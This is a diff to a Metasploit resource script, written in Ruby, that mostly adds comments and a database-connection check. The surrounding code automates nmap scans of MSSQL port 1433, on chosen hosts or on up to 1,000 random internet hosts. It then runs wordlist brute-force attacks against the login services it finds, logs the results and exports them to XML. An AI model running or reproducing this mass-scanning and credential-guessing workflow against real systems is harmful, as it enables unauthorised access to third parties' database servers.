@@ -29,6 +29,18 @@
       print_line("")
 
 
+      ## Make sure we are connected to db
+      unless framework.db.active
+        print_error("Database not connected to postgresql.")
+        print_warning("[execute] service postgresql start")
+        run_single("exit")
+        return nil
+      else
+        print_good("Database connected to postgresql.")
+        Rex::sleep(1.0)
+      end
+
+      ## Sellect the type of nmap scan to use
       if (framework.datastore['RANDOM_HOSTS'] == "true")
          if (framework.datastore['LIMMIT'] == nil or framework.datastore['LIMMIT'] == '')
            run_single("setg LIMMIT 1000")
@@ -43,6 +55,7 @@
          print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
       end
 
+      ## Metasploit auxiliarys brute force dicionary absoluct path's
       if (framework.datastore['PASS_FILE'] == nil or framework.datastore['PASS_FILE'] == '')
          run_single("setg PASS_FILE /usr/share/metasploit-framework/data/wordlists/password.lst")
          nse_pass = "#{framework.datastore['PASS_FILE']}"
@@ -52,6 +65,7 @@
          nse_users = "#{framework.datastore['USER_FILE']}"
       end
 
+      ## db_nmap WAN or RHOSTS scan settings
       unless (framework.datastore['RANDOM_HOSTS'] == "true")
          run_single("db_nmap -sV -Pn -T4 -O -p T:1433 --open --script=ms-sql-info.nse #{framework.datastore['RHOSTS']}")
       else
@@ -59,6 +73,7 @@
          run_single("db_nmap -sV -Pn -T4 -O -p T:1433 --open -iR #{framework.datastore['LIMMIT']} --script=ms-sql-info.nse")
       end
 
+      ## Read the database 
       run_single("spool mssql_brute.log")
       print_line("")
       run_single("services")
@@ -68,6 +83,7 @@
       proto = framework.db.services.map(&:proto).join(' ')
       xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')
 
+      ## Make sure that exists hosts/ports (open) in database
       if xhost.nil? or xhost == ''
            print_error("db_nmap scan did not find any alive connections.")
            print_error("Please wait, cleaning recent configurations.")
@@ -86,6 +102,7 @@
            return nil
       end
 
+      ## Make sure that dicionary files exist (pass)
       unless (File.exist?(nse_pass))
            print_error("[ERROR] Dicionary absoluct path not found.")
            print_error("[ERROR] #{framework.datastore['PASS_FILE']}")
@@ -100,6 +117,7 @@
            return nil
       end
 
+      ## Make sure that dicionary files exist (users)
       unless (File.exist?(nse_users))
            print_error("[ERROR] Dicionary absoluct path not found.")
            print_error("[ERROR] #{framework.datastore['USER_FILE']}")
@@ -114,6 +132,7 @@
            return nil
       end
 
+      ## brute force / gather information function
       print_status("Operative systems: #{xname}")
       run_single("setg RHOSTS #{xhost}")
       Rex::sleep(2.0)
@@ -131,13 +150,14 @@
            run_single("exploit")
       end
 
-
+      ## Save current database to local file (database.xml)
       if (framework.datastore['SAVE_DB'] == "true")
          rand = Rex::Text.rand_text_alpha(5)
          print_warning("Exporting database to: database_#{rand}.xml")
          run_single("db_export -f xml -a database_#{rand}.xml")
       end
 
+      ## Cleaning database and unset global variables
       print_warning("Please wait, Cleaning global variables.")
       Rex::sleep(1.5)
       run_single("unsetg all")
